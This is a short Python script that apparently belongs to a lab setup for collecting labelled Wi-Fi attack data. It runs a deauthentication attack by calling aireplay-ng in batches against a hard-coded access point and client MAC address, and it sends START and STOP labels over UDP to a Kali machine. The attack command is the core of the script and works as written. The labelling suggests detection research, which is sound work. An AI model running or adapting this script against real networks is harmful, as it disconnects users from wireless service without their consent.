import os
import socket
import time

PC_IP = '192.168.220.1' # IP of VMNet1 interface on Kali (the device that receives labels)
PC_PORT = 9999

BSSID = '68:02:b8:bb:af:57'
TARGET_MAC = 'b0:cb:d8:c9:92:00'
LABEL_REPEATS = 1
LABEL_PAUSE = 0.2

def send_label(status, repeats=LABEL_REPEATS, pause=LABEL_PAUSE):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(repeats):
        sock.sendto(status.encode(), (PC_IP, PC_PORT))
        time.sleep(pause)

print(">>> READY FOR ATTACK, NOTIFY THE LABELERS")
send_label("START")
time.sleep(0.5)

# Send deauth frames in small batches to reduce interruption on ESP32
batch = 10
repeats = 5
pause_between_batches = 0.5

for i in range(repeats):
    print(f">>> Batch {i+1}/{repeats}: sending {batch} deauth frames")
    os.system(f"aireplay-ng -0 {batch} -a {BSSID} -c {TARGET_MAC} wlan0mon")
    time.sleep(pause_between_batches)

time.sleep(1)
send_label("STOP")
print(" >>> ATTACK IS FINISHED")
